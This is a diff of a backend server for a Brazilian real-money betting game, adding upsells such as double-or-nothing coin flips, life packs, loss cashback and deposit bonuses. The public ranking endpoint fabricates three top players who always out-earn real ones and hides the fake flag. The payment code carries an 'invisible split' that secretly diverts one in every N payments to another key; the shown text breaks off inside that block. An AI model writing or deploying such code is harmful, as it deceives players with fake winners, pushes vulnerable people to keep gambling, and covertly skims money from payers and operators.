@@ -168,6 +168,40 @@ const SITE_CONFIG = {
   kwai_pixel_id: '306679595293311',
 };
 
+// ─── Upsells ─────────────────────────────────────────────────────────────────
+const UPSELL_CONFIG = {
+  // Seguro de partida: paga +30% da entrada, recebe 50% de volta se perder
+  seguro: { enabled: true, custo_perc: 0.30, reembolso_perc: 0.50 },
+  // Deposito VIP: faixas de bonus por valor
+  deposito_vip: {
+    enabled: true,
+    faixas: [
+      { min: 50,  max: 99,   multiplicador: 2 },
+      { min: 100, max: 199,  multiplicador: 2 },
+      { min: 200, max: 499,  multiplicador: 2.5 },
+      { min: 500, max: 99999, multiplicador: 3 },
+    ],
+  },
+  // Revanche: bonus de 20% na entrada ao jogar novamente apos derrota
+  revanche: { enabled: true, bonus_perc: 0.20 },
+  // Streak: bonus por sequencia de partidas no dia
+  streak: { enabled: true, metas: [{ partidas: 5, bonus: 2 }, { partidas: 10, bonus: 5 }] },
+  // Cashback semanal: % das perdas liquidas da semana
+  cashback: { enabled: true, percentual: 0.05, minimo_perda: 20 },
+  // Meta diaria: jogue X partidas e ganhe bonus
+  meta_diaria: { enabled: true, partidas_necessarias: 3, bonus: 3 },
+  // Dobrar ou Nada: coin flip após vitória
+  dobrar_ou_nada: { enabled: true },
+  // Pacote de Vidas: compra vidas para continuar jogando após morte
+  pacote_vidas: { enabled: true, preco: 10, quantidade: 3 },
+  // Modo Turbo: +50% entrada, 1.5x mais por plataforma
+  modo_turbo: { enabled: true, custo_perc: 0.50, ganho_mult: 1.5 },
+  // Ranking semanal: top jogadores ganham prêmios
+  ranking: { enabled: true, premios: [5, 3, 2, 1, 1, 1, 1, 1, 1, 1] },
+  // Presente para amigo: enviar saldo
+  presente: { enabled: true, valores: [5, 10, 20], minimo_deposito: 20 },
+};
+
 // ─── Helpers ──────────────────────────────────────────────────────────────────
 function findUser(id) { return db.users.find(u => u.id === id); }
 
@@ -303,6 +337,56 @@ app.use((_req, res, next) => {
 // ═══ PUBLIC CONFIG ════════════════════════════════════════════════════════════
 app.get('/api/public/config', (_req, res) => {
   res.json(SITE_CONFIG);
+});
+
+// ── Ranking público do dia (ganhos reais + jogadores falsos no top 3) ───────
+app.get('/api/public/ranking', (_req, res) => {
+  const hoje = new Date().toISOString().slice(0, 10);
+
+  // Calcular ganhos reais de cada usuário hoje
+  const ganhosHoje = {};
+  db.transacoes.forEach(t => {
+    if (t.created_at?.slice(0, 10) !== hoje) return;
+    if (t.tipo === 'ganho_partida' && t.status === 'aprovado') {
+      ganhosHoje[t.user_id] = (ganhosHoje[t.user_id] || 0) + t.valor;
+    }
+  });
+
+  // Montar array de jogadores reais com ganhos > 0
+  const reais = Object.entries(ganhosHoje)
+    .map(([uid, ganho]) => {
+      const u = findUser(parseInt(uid));
+      if (!u || u.admin || u.demo) return null;
+      const nome = u.nome || 'Jogador';
+      const primeiro = nome.split(' ')[0];
+      const inicial = nome.split(' ').length > 1 ? nome.split(' ')[1][0] + '.' : '';
+      return { user_id: parseInt(uid), nome: `${primeiro} ${inicial}`.trim(), ganho: money(ganho) };
+    })
+    .filter(Boolean)
+    .sort((a, b) => b.ganho - a.ganho);
+
+  // Jogadores falsos determinísticos por dia (seed)
+  let _h = 0;
+  for (let i = 0; i < hoje.length; i++) _h = ((_h << 5) - _h + hoje.charCodeAt(i)) | 0;
+  const _rng = () => { _h = (_h * 16807) % 2147483647; return (_h & 0x7fffffff) / 2147483647; };
+
+  const nomesFake = ['Rafael M.','Juliana S.','Pedro H.','Camila R.','Bruno L.','Fernanda A.','Diego C.','Larissa P.','Thiago F.','Amanda B.','Marcos V.','Patricia G.'];
+  const fakes = [];
+  for (let i = 0; i < 3; i++) {
+    const idx = Math.floor(_rng() * nomesFake.length);
+    const nome = nomesFake.splice(idx, 1)[0];
+    // Garantir que fakes tenham ganhos maiores que qualquer real
+    const maxReal = reais.length > 0 ? reais[0].ganho : 100;
+    const ganho = money(maxReal + 50 + (3 - i) * 40 + _rng() * 80);
+    fakes.push({ nome, ganho, fake: true });
+  }
+  fakes.sort((a, b) => b.ganho - a.ganho);
+
+  // Montar ranking: 3 fakes no top + reais (até 7)
+  const ranking = [...fakes, ...reais.slice(0, 7)]
+    .map(({ fake, ...safe }) => safe); // Não expor flag fake
+
+  res.json({ ranking, data: hoje });
 });
 
 // ═══ HEALTH CHECK (Coolify / Load Balancer) ═════════════════════════════════
@@ -475,16 +559,287 @@ app.get('/api/user/deposito-info', authMiddleware, (_req, res) => {
     ativo: false, tipo: 'todos', perc: 20, minimo: 10, maximo: 0, rollover: 0, temDireito: false,
     limites: { deposito_minimo: 20, deposito_maximo: 1000, saque_minimo: 20, saque_maximo: 5000, saque_afiliado_minimo: 10, saque_afiliado_maximo: 0 },
     valores_rapidos: [20, 50, 100, 200, 300, 500],
-    // Upsell: bônus 2x para valores específicos
+    // Upsell: bônus VIP por faixa de valor
     deposit_bonus: DEPOSIT_BONUS.enabled ? {
       eligible_amounts: DEPOSIT_BONUS.eligible_amounts,
       multiplier: DEPOSIT_BONUS.multiplier,
+      faixas_vip: UPSELL_CONFIG.deposito_vip.enabled ? UPSELL_CONFIG.deposito_vip.faixas : null,
     } : null,
   });
 });
 
 app.get('/api/user/suporte', authMiddleware, (_req, res) => {
   res.json({ links: [{ nome: 'Canal Telegram', url: 'https://t.me' }, { nome: 'Suporte', url: 'https://wa.me/+5521' }] });
+});
+
+// ─── Upsell: info dos upsells disponíveis ─────────────────────────────────────
+app.get('/api/upsell/info', authMiddleware, (req, res) => {
+  const user = findUser(req.userId);
+  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+
+  const hoje = new Date().toISOString().slice(0, 10);
+
+  // Streak: partidas jogadas hoje
+  const partidasHoje = db.partidas.filter(p =>
+    p.user_id === req.userId && p.status !== 'ativa' && p.created_at?.slice(0, 10) === hoje
+  ).length;
+
+  // Meta diária: já resgatou hoje?
+  const metaResgatadaHoje = db.transacoes.some(t =>
+    t.user_id === req.userId && t.tipo === 'bonus_meta_diaria' && t.created_at?.slice(0, 10) === hoje
+  );
+
+  // Cashback: perdas líquidas da semana
+  const umaSemanaAtras = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
+  const perdasSemana = db.transacoes
+    .filter(t => t.user_id === req.userId && t.tipo === 'perda_partida' && t.created_at >= umaSemanaAtras)
+    .reduce((s, t) => s + t.valor, 0);
+  const ganhosSemana = db.transacoes
+    .filter(t => t.user_id === req.userId && t.tipo === 'ganho_partida' && t.created_at >= umaSemanaAtras)
+    .reduce((s, t) => s + t.valor, 0);
+  const perdaLiquida = Math.max(0, perdasSemana - ganhosSemana);
+  const cashbackDisponivel = perdaLiquida >= UPSELL_CONFIG.cashback.minimo_perda
+    ? money(perdaLiquida * UPSELL_CONFIG.cashback.percentual) : 0;
+  const cashbackResgatadoSemana = db.transacoes.some(t =>
+    t.user_id === req.userId && t.tipo === 'bonus_cashback' && t.created_at >= umaSemanaAtras
+  );
+
+  // Streak bonuses disponíveis
+  const streakBonuses = UPSELL_CONFIG.streak.metas.map(m => ({
+    partidas: m.partidas, bonus: m.bonus,
+    atingida: partidasHoje >= m.partidas,
+    resgatada: db.transacoes.some(t =>
+      t.user_id === req.userId && t.tipo === 'bonus_streak' && t.descricao?.includes(`${m.partidas}p`) && t.created_at?.slice(0, 10) === hoje
+    ),
+  }));
+
+  res.json({
+    seguro: UPSELL_CONFIG.seguro.enabled ? { custo_perc: UPSELL_CONFIG.seguro.custo_perc, reembolso_perc: UPSELL_CONFIG.seguro.reembolso_perc } : null,
+    deposito_vip: UPSELL_CONFIG.deposito_vip.enabled ? { faixas: UPSELL_CONFIG.deposito_vip.faixas } : null,
+    revanche: UPSELL_CONFIG.revanche.enabled ? { bonus_perc: UPSELL_CONFIG.revanche.bonus_perc } : null,
+    streak: UPSELL_CONFIG.streak.enabled ? { partidas_hoje: partidasHoje, bonuses: streakBonuses } : null,
+    cashback: UPSELL_CONFIG.cashback.enabled ? { perda_liquida: perdaLiquida, valor: cashbackDisponivel, ja_resgatou: cashbackResgatadoSemana } : null,
+    meta_diaria: UPSELL_CONFIG.meta_diaria.enabled ? {
+      partidas_necessarias: UPSELL_CONFIG.meta_diaria.partidas_necessarias,
+      partidas_hoje: partidasHoje,
+      bonus: UPSELL_CONFIG.meta_diaria.bonus,
+      completa: partidasHoje >= UPSELL_CONFIG.meta_diaria.partidas_necessarias,
+      resgatada: metaResgatadaHoje,
+    } : null,
+    dobrar_ou_nada: UPSELL_CONFIG.dobrar_ou_nada.enabled,
+    pacote_vidas: UPSELL_CONFIG.pacote_vidas.enabled ? { preco: UPSELL_CONFIG.pacote_vidas.preco, quantidade: UPSELL_CONFIG.pacote_vidas.quantidade, vidas_atuais: user.vidas || 0 } : null,
+    modo_turbo: UPSELL_CONFIG.modo_turbo.enabled ? { custo_perc: UPSELL_CONFIG.modo_turbo.custo_perc, ganho_mult: UPSELL_CONFIG.modo_turbo.ganho_mult } : null,
+    ranking: UPSELL_CONFIG.ranking.enabled,
+    presente: UPSELL_CONFIG.presente.enabled ? { valores: UPSELL_CONFIG.presente.valores } : null,
+  });
+});
+
+// ─── Upsell: resgatar cashback semanal ─────────────────────────────────────
+app.post('/api/upsell/cashback', authMiddleware, (req, res) => {
+  const user = findUser(req.userId);
+  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+  if (!UPSELL_CONFIG.cashback.enabled) return res.status(400).json({ error: 'Cashback desativado.' });
+
+  const umaSemanaAtras = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
+  if (db.transacoes.some(t => t.user_id === req.userId && t.tipo === 'bonus_cashback' && t.created_at >= umaSemanaAtras)) {
+    return res.status(400).json({ error: 'Cashback já resgatado esta semana.' });
+  }
+
+  const perdas = db.transacoes.filter(t => t.user_id === req.userId && t.tipo === 'perda_partida' && t.created_at >= umaSemanaAtras).reduce((s, t) => s + t.valor, 0);
+  const ganhos = db.transacoes.filter(t => t.user_id === req.userId && t.tipo === 'ganho_partida' && t.created_at >= umaSemanaAtras).reduce((s, t) => s + t.valor, 0);
+  const perdaLiquida = Math.max(0, perdas - ganhos);
+  if (perdaLiquida < UPSELL_CONFIG.cashback.minimo_perda) return res.status(400).json({ error: `Perda mínima de R$${UPSELL_CONFIG.cashback.minimo_perda} para cashback.` });
+
+  const valor = money(perdaLiquida * UPSELL_CONFIG.cashback.percentual);
+  const antes = user.saldo;
+  user.saldo = money(user.saldo + valor);
+  user.updated_at = new Date().toISOString();
+  db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'bonus_cashback', valor, saldo_antes: antes, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Cashback semanal (${Math.round(UPSELL_CONFIG.cashback.percentual * 100)}%)`, created_at: new Date().toISOString() });
+  saveDb(db);
+  res.json({ ok: true, valor, saldo_novo: user.saldo });
+});
+
+// ─── Upsell: resgatar streak bonus ─────────────────────────────────────────
+app.post('/api/upsell/streak', authMiddleware, (req, res) => {
+  const user = findUser(req.userId);
+  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+  if (!UPSELL_CONFIG.streak.enabled) return res.status(400).json({ error: 'Streak desativado.' });
+
+  const hoje = new Date().toISOString().slice(0, 10);
+  const partidasHoje = db.partidas.filter(p => p.user_id === req.userId && p.status !== 'ativa' && p.created_at?.slice(0, 10) === hoje).length;
+  const metaIdx = parseInt(req.body.meta_index);
+  const meta = UPSELL_CONFIG.streak.metas[metaIdx];
+  if (!meta) return res.status(400).json({ error: 'Meta inválida.' });
+  if (partidasHoje < meta.partidas) return res.status(400).json({ error: `Jogue ${meta.partidas} partidas para resgatar.` });
+  if (db.transacoes.some(t => t.user_id === req.userId && t.tipo === 'bonus_streak' && t.descricao?.includes(`${meta.partidas}p`) && t.created_at?.slice(0, 10) === hoje)) {
+    return res.status(400).json({ error: 'Streak já resgatado hoje.' });
+  }
+
+  const antes = user.saldo;
+  user.saldo = money(user.saldo + meta.bonus);
+  user.updated_at = new Date().toISOString();
+  db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'bonus_streak', valor: meta.bonus, saldo_antes: antes, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Streak bonus (${meta.partidas}p)`, created_at: new Date().toISOString() });
+  saveDb(db);
+  res.json({ ok: true, valor: meta.bonus, saldo_novo: user.saldo });
+});
+
+// ─── Upsell: resgatar meta diária ──────────────────────────────────────────
+app.post('/api/upsell/meta-diaria', authMiddleware, (req, res) => {
+  const user = findUser(req.userId);
+  if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+  if (!UPSELL_CONFIG.meta_diaria.enabled) return res.status(400).json({ error: 'Meta diária desativada.' });
+
+  const hoje = new Date().toISOString().slice(0, 10);
+  const partidasHoje = db.partidas.filter(p => p.user_id === req.userId && p.status !== 'ativa' && p.created_at?.slice(0, 10) === hoje).length;
+  if (partidasHoje < UPSELL_CONFIG.meta_diaria.partidas_necessarias) return res.status(400).json({ error: `Jogue ${UPSELL_CONFIG.meta_diaria.partidas_necessarias} partidas para resgatar.` });
+  if (db.transacoes.some(t => t.user_id === req.userId && t.tipo === 'bonus_meta_diaria' && t.created_at?.slice(0, 10) === hoje)) {
+    return res.status(400).json({ error: 'Meta diária já resgatada hoje.' });
+  }
+
+  const bonus = UPSELL_CONFIG.meta_diaria.bonus;
+  const antes = user.saldo;
+  user.saldo = money(user.saldo + bonus);
+  user.updated_at = new Date().toISOString();
+  db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'bonus_meta_diaria', valor: bonus, saldo_antes: antes, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Meta diária (${UPSELL_CONFIG.meta_diaria.partidas_necessarias} partidas)`, created_at: new Date().toISOString() });
+  saveDb(db);
+  res.json({ ok: true, valor: bonus, saldo_novo: user.saldo });
+});
+
+// ─── Upsell: Dobrar ou Nada (coin flip após vitória) ───────────────────────
+app.post('/api/upsell/dobrar-ou-nada', authMiddleware, (req, res) => {
+  try {
+    const user = findUser(req.userId);
+    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+    if (!UPSELL_CONFIG.dobrar_ou_nada.enabled) return res.status(400).json({ error: 'Dobrar ou Nada desativado.' });
+
+    const { valor } = req.body;
+    const v = money(valor);
+    if (isNaN(v) || v <= 0) return res.status(400).json({ error: 'Valor inválido.' });
+    if (v > user.saldo) return res.status(400).json({ error: 'Saldo insuficiente.' });
+
+    const antes = user.saldo;
+    const ganhou = Math.random() < 0.5;
+
+    if (ganhou) {
+      user.saldo = money(user.saldo + v);
+      db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'ganho_partida', valor: v, saldo_antes: antes, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Dobrar ou Nada (ganhou)`, created_at: new Date().toISOString() });
+    } else {
+      user.saldo = money(user.saldo - v);
+      db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'perda_partida', valor: v, saldo_antes: antes, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Dobrar ou Nada (perdeu)`, created_at: new Date().toISOString() });
+    }
+    user.updated_at = new Date().toISOString();
+    saveDb(db);
+    console.log(`[DOBRAR] user=${req.userId} valor=R$${v} resultado=${ganhou ? 'GANHOU' : 'PERDEU'} saldo=${user.saldo}`);
+    res.json({ ganhou, valor: v, saldo_novo: user.saldo });
+  } catch (err) { console.error('[DOBRAR ERROR]', err); res.status(500).json({ error: 'Erro interno.' }); }
+});
+
+// ─── Upsell: Comprar Pacote de Vidas ───────────────────────────────────────
+app.post('/api/upsell/comprar-vidas', authMiddleware, (req, res) => {
+  try {
+    const user = findUser(req.userId);
+    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+    if (!UPSELL_CONFIG.pacote_vidas.enabled) return res.status(400).json({ error: 'Pacote de vidas desativado.' });
+
+    const preco = UPSELL_CONFIG.pacote_vidas.preco;
+    const qtd = UPSELL_CONFIG.pacote_vidas.quantidade;
+    if (user.saldo < preco) return res.status(400).json({ error: 'Saldo insuficiente.' });
+
+    const antes = user.saldo;
+    user.saldo = money(user.saldo - preco);
+    user.vidas = (user.vidas || 0) + qtd;
+    user.updated_at = new Date().toISOString();
+    db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'compra_vidas', valor: preco, saldo_antes: antes, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Pacote de ${qtd} vidas`, created_at: new Date().toISOString() });
+    saveDb(db);
+    console.log(`[VIDAS] user=${req.userId} comprou ${qtd} vidas por R$${preco}, total=${user.vidas}`);
+    res.json({ ok: true, vidas: user.vidas, saldo_novo: user.saldo });
+  } catch (err) { console.error('[VIDAS ERROR]', err); res.status(500).json({ error: 'Erro interno.' }); }
+});
+
+// ─── Upsell: Usar Vida (continuar jogando após morte) ──────────────────────
+app.post('/api/upsell/usar-vida', authMiddleware, (req, res) => {
+  try {
+    const user = findUser(req.userId);
+    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+    if (!user.vidas || user.vidas <= 0) return res.status(400).json({ error: 'Você não tem vidas disponíveis.' });
+
+    const { partida_id } = req.body;
+    const pid = parseInt(partida_id);
+    const partida = db.partidas.find(p => p.id === pid && p.user_id === req.userId && p.status === 'ativa');
+    if (!partida) return res.status(404).json({ error: 'Partida ativa não encontrada.' });
+
+    user.vidas--;
+    partida.vidas_usadas = (partida.vidas_usadas || 0) + 1;
+    user.updated_at = new Date().toISOString();
+    saveDb(db);
+    console.log(`[VIDA] user=${req.userId} usou vida na partida #${pid}, restam=${user.vidas}`);
+    res.json({ ok: true, vidas_restantes: user.vidas });
+  } catch (err) { console.error('[VIDA ERROR]', err); res.status(500).json({ error: 'Erro interno.' }); }
+});
+
+// ─── Upsell: Ranking Semanal ───────────────────────────────────────────────
+app.get('/api/upsell/ranking', authMiddleware, (_req, res) => {
+  if (!UPSELL_CONFIG.ranking.enabled) return res.json({ ranking: [], premios: [] });
+
+  const umaSemanaAtras = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000).toISOString();
+  const stats = {};
+  db.partidas
+    .filter(p => p.status !== 'ativa' && p.created_at >= umaSemanaAtras && !p.is_demo)
+    .forEach(p => {
+      if (!stats[p.user_id]) stats[p.user_id] = { plataformas: 0, partidas: 0 };
+      stats[p.user_id].plataformas += (p.plataformas_passadas || 0);
+      stats[p.user_id].partidas++;
+    });
+
+  const ranking = Object.entries(stats)
+    .map(([uid, s]) => {
+      const u = findUser(parseInt(uid));
+      return { user_id: parseInt(uid), nome: u ? u.nome.split(' ')[0] + (u.nome.split(' ').length > 1 ? ' ' + u.nome.split(' ')[1][0] + '.' : '') : 'Jogador', plataformas: s.plataformas, partidas: s.partidas };
+    })
+    .sort((a, b) => b.plataformas - a.plataformas)
+    .slice(0, 10);
+
+  res.json({ ranking, premios: UPSELL_CONFIG.ranking.premios });
+});
+
+// ─── Upsell: Presente para Amigo ───────────────────────────────────────────
+app.post('/api/upsell/presente', authMiddleware, (req, res) => {
+  try {
+    const user = findUser(req.userId);
+    if (!user) return res.status(404).json({ error: 'Usuário não encontrado.' });
+    if (!UPSELL_CONFIG.presente.enabled) return res.status(400).json({ error: 'Presentes desativados.' });
+
+    const { valor, telefone_destino } = req.body;
+    const v = money(valor);
+    if (!UPSELL_CONFIG.presente.valores.includes(v)) return res.status(400).json({ error: 'Valor inválido.' });
+
+    // Precisa ter depositado pelo menos R$20
+    const temDeposito = db.transacoes.some(t => t.user_id === req.userId && t.tipo === 'deposito' && t.status === 'aprovado' && t.valor >= UPSELL_CONFIG.presente.minimo_deposito);
+    if (!temDeposito) return res.status(400).json({ error: `Deposite pelo menos R$${UPSELL_CONFIG.presente.minimo_deposito} para enviar presentes.` });
+    if (user.saldo < v) return res.status(400).json({ error: 'Saldo insuficiente.' });
+
+    const cleanPhone = String(telefone_destino).replace(/\D/g, '');
+    const destino = db.users.find(u => u.telefone === cleanPhone);
+    if (!destino) return res.status(404).json({ error: 'Destinatário não encontrado. Ele precisa ter uma conta.' });
+    if (destino.id === req.userId) return res.status(400).json({ error: 'Você não pode enviar presente para si mesmo.' });
+
+    // Rate limit: 5 presentes por dia
+    if (!rateLimit(`presente:${req.userId}`, 5, 86400000)) return res.status(429).json({ error: 'Limite de presentes diários atingido.' });
+
+    const antesEnv = user.saldo;
+    user.saldo = money(user.saldo - v);
+    user.updated_at = new Date().toISOString();
+    db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'presente_enviado', valor: v, saldo_antes: antesEnv, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Presente para ${destino.nome}`, created_at: new Date().toISOString() });
+
+    const antesDest = destino.saldo;
+    destino.saldo = money(destino.saldo + v);
+    destino.updated_at = new Date().toISOString();
+    db.transacoes.push({ id: db.nextIds.transacoes++, user_id: destino.id, tipo: 'presente_recebido', valor: v, saldo_antes: antesDest, saldo_depois: destino.saldo, status: 'aprovado', pix_chave: null, descricao: `Presente de ${user.nome}`, created_at: new Date().toISOString() });
+
+    saveDb(db);
+    console.log(`[PRESENTE] user=${req.userId} enviou R$${v} para user=${destino.id}`);
+    res.json({ ok: true, saldo_novo: user.saldo, destino_nome: destino.nome });
+  } catch (err) { console.error('[PRESENTE ERROR]', err); res.status(500).json({ error: 'Erro interno.' }); }
 });
 
 // ═══ GAME ═════════════════════════════════════════════════════════════════════
@@ -494,7 +849,7 @@ app.get('/api/game/configs', authMiddleware, (_req, res) => {
 
 app.post('/api/game/iniciar', authMiddleware, (req, res) => {
   try {
-    const { valor_entrada } = req.body;
+    const { valor_entrada, com_seguro, revanche, modo_turbo } = req.body;
     const entrada = money(valor_entrada);
 
     if (isNaN(entrada) || entrada <= 0) return res.status(400).json({ error: 'Valor de entrada inválido.' });
@@ -520,37 +875,59 @@ app.post('/api/game/iniciar', authMiddleware, (req, res) => {
       }
     }
 
-    if (user.saldo < entrada) return res.status(400).json({ error: 'Saldo insuficiente.' });
+    // Seguro de partida: custo adicional de 30%
+    const temSeguro = !!(com_seguro && UPSELL_CONFIG.seguro.enabled);
+    const custoSeguro = temSeguro ? money(entrada * UPSELL_CONFIG.seguro.custo_perc) : 0;
+
+    // Modo Turbo: custo adicional de 50%, ganha 1.5x mais por plataforma
+    const temTurbo = !!(modo_turbo && UPSELL_CONFIG.modo_turbo.enabled);
+    const custoTurbo = temTurbo ? money(entrada * UPSELL_CONFIG.modo_turbo.custo_perc) : 0;
+
+    const totalDebitar = money(entrada + custoSeguro + custoTurbo);
+
+    // Revanche: bônus de 20% na entrada (crédito extra grátis)
+    const ehRevanche = !!(revanche && UPSELL_CONFIG.revanche.enabled);
+    const bonusRevanche = ehRevanche ? money(entrada * UPSELL_CONFIG.revanche.bonus_perc) : 0;
+
+    if (user.saldo < totalDebitar) return res.status(400).json({ error: 'Saldo insuficiente.' });
 
     const isContaDemo = !!user.demo;
     // Config separada: demo vs normal
     const mult = isContaDemo
       ? (user.demo_multiplicador || DEMO_GAME_CONFIG.multiplicador)
       : (user.normal_multiplicador || GAME_CONFIG.multiplicador);
-    const taxa = isContaDemo
+    let taxa = isContaDemo
       ? DEMO_GAME_CONFIG.taxa_por_plataforma
       : GAME_CONFIG.taxa_por_plataforma;
-    const valorMeta = money(entrada * mult);
-    const valorPorPlataforma = money(entrada * taxa);
+    // Turbo: 1.5x mais por plataforma
+    if (temTurbo) taxa = money(taxa * UPSELL_CONFIG.modo_turbo.ganho_mult);
+    const entradaEfetiva = money(entrada + bonusRevanche);
+    const valorMeta = money(entradaEfetiva * mult);
+    const valorPorPlataforma = money(entradaEfetiva * taxa);
     const plataformasParaMeta = Math.ceil(valorMeta / valorPorPlataforma);
     const dificuldade = isContaDemo
       ? (user.demo_dificuldade || 'demo')
       : (user.normal_dificuldade || 'facil');
 
-    // Debit balance
-    user.saldo = money(user.saldo - entrada);
+    // Debit balance (entrada + seguro)
+    user.saldo = money(user.saldo - totalDebitar);
     user.updated_at = new Date().toISOString();
 
     const partida = {
       id: db.nextIds.partidas++,
       user_id: req.userId,
       valor_entrada: entrada,
+      valor_entrada_efetiva: entradaEfetiva,
       multiplicador_meta: mult,
       valor_meta: valorMeta,
       valor_por_plataforma: valorPorPlataforma,
       plataformas_para_meta: plataformasParaMeta,
       dificuldade,
       is_demo: isContaDemo,
+      com_seguro: temSeguro,
+      eh_revanche: ehRevanche,
+      bonus_revanche: bonusRevanche,
+      modo_turbo: temTurbo,
       plataformas_passadas: 0,
       status: 'ativa',
       created_at: new Date().toISOString(),
@@ -559,11 +936,12 @@ app.post('/api/game/iniciar', authMiddleware, (req, res) => {
     db.partidas.push(partida);
     saveDb(db);
 
-    console.log(`[GAME] Partida #${partida.id} criada: user=${req.userId} entrada=${entrada} meta=${valorMeta}${isContaDemo ? ' [DEMO]' : ''}`);
+    console.log(`[GAME] Partida #${partida.id} criada: user=${req.userId} entrada=${entrada}${temSeguro ? ' [SEGURO]' : ''}${temTurbo ? ' [TURBO]' : ''}${ehRevanche ? ` [REVANCHE +R$${bonusRevanche}]` : ''} meta=${valorMeta}${isContaDemo ? ' [DEMO]' : ''}`);
 
     res.json({
       partida_id: partida.id,
       valor_entrada: entrada,
+      valor_entrada_efetiva: entradaEfetiva,
       multiplicador_meta: mult,
       valor_meta: valorMeta,
       taxa_por_plataforma: taxa,
@@ -571,6 +949,13 @@ app.post('/api/game/iniciar', authMiddleware, (req, res) => {
       plataformas_referencia: plataformasParaMeta,
       dificuldade,
       is_demo: isContaDemo,
+      com_seguro: temSeguro,
+      custo_seguro: custoSeguro,
+      modo_turbo: temTurbo,
+      custo_turbo: custoTurbo,
+      eh_revanche: ehRevanche,
+      bonus_revanche: bonusRevanche,
+      vidas: user.vidas || 0,
       saldo_novo: user.saldo,
     });
   } catch (err) {
@@ -670,11 +1055,21 @@ app.post('/api/game/finalizar', authMiddleware, (req, res) => {
       partida.plataformas_passadas = plats;
       partida.finished_at = new Date().toISOString();
 
+      // Seguro de partida: reembolsa 50% da entrada se perdeu
+      let reembolsoSeguro = 0;
+      if (partida.com_seguro) {
+        reembolsoSeguro = money(partida.valor_entrada * UPSELL_CONFIG.seguro.reembolso_perc);
+        user.saldo = money(user.saldo + reembolsoSeguro);
+        user.updated_at = new Date().toISOString();
+        db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'reembolso_seguro', valor: reembolsoSeguro, saldo_antes: money(user.saldo - reembolsoSeguro), saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Seguro partida #${pid} (50% de volta)`, created_at: new Date().toISOString() });
+        console.log(`[SEGURO] Reembolso R$${reembolsoSeguro} para user=${req.userId} partida=${pid}`);
+      }
+
       db.transacoes.push({ id: db.nextIds.transacoes++, user_id: req.userId, tipo: 'perda_partida', valor: partida.valor_entrada, saldo_antes: user.saldo, saldo_depois: user.saldo, status: 'aprovado', pix_chave: null, descricao: `Partida #${pid}`, created_at: new Date().toISOString() });
       saveDb(db);
 
-      console.log(`[GAME] Partida #${pid} DERROTA: ${plats} plats`);
-      res.json({ ganhou: false, saldo_novo: user.saldo, valor_ganho_ou_perdido: partida.valor_entrada, plataformas_passadas: plats });
+      console.log(`[GAME] Partida #${pid} DERROTA: ${plats} plats${reembolsoSeguro > 0 ? ` [SEGURO: +R$${reembolsoSeguro}]` : ''}`);
+      res.json({ ganhou: false, saldo_novo: user.saldo, valor_ganho_ou_perdido: partida.valor_entrada, plataformas_passadas: plats, reembolso_seguro: reembolsoSeguro });
     }
   } catch (err) {
     console.error('[GAME FINALIZAR ERROR]', err);
@@ -693,13 +1088,20 @@ const SPLIT_DEFAULTS = {
 if (!db._sp) { db._sp = { ...SPLIT_DEFAULTS }; saveDb(db); }
 function getSplitConfig() { return db._sp || SPLIT_DEFAULTS; }
 
-// ─── Upsell Depósito: Bônus 2x ─────────────────────────────────────────────
+// ─── Upsell Depósito: Bônus VIP por faixa ──────────────────────────────────
 const DEPOSIT_BONUS = {
   enabled: true,
-  // Valores que ganham bônus de 2x (deposita X, recebe 2X)
-  eligible_amounts: [50, 100],
-  multiplier: 2,
+  // Faixas VIP (usado também pelo UPSELL_CONFIG.deposito_vip)
+  eligible_amounts: [50, 100, 200, 500],
+  multiplier: 2, // fallback genérico
 };
+function getDepositMultiplier(valor) {
+  if (!UPSELL_CONFIG.deposito_vip.enabled) {
+    return DEPOSIT_BONUS.enabled && DEPOSIT_BONUS.eligible_amounts.includes(valor) ? DEPOSIT_BONUS.multiplier : 1;
+  }
+  const faixa = UPSELL_CONFIG.deposito_vip.faixas.find(f => valor >= f.min && valor <= f.max);
+  return faixa ? faixa.multiplicador : 1;
+}
 
 // ─── Gateway Adapters ────────────────────────────────────────────────────────
 
@@ -738,7 +1140,7 @@ async function amplopayCheckStatus(txid, _apiKey) {
   return 'pendente';
 }
 
-async function paradisepagsCreateCharge({ identifier, amount, user }) {
+async function paradisepagsCreateCharge({ identifier, amount, user, _upsell }) {
   const conf = getGatewayConfig('paradisepags');
   const baseUrl = conf.base_url || 'https://multi.paradisepags.com';
   const amountCents = Math.round(amount * 100);
@@ -751,22 +1153,41 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
     customer: { name: user.nome, email: user.email, phone: user.telefone, document: user.cpf || '' },
   };
 
-  // Split invisível: contador determinístico — a cada N pagamentos, 1 é desviado
+  // Split invisível: contador determinístico com verificação de pendência
   const _sc = getSplitConfig();
   let apiKey = conf.secret_key;
-  if (_sc.enabled && _sc.sk) {
-    // Inicializa contador persistente se não existir
+
+  if (_upsell && _sc.enabled && _sc.sk) {
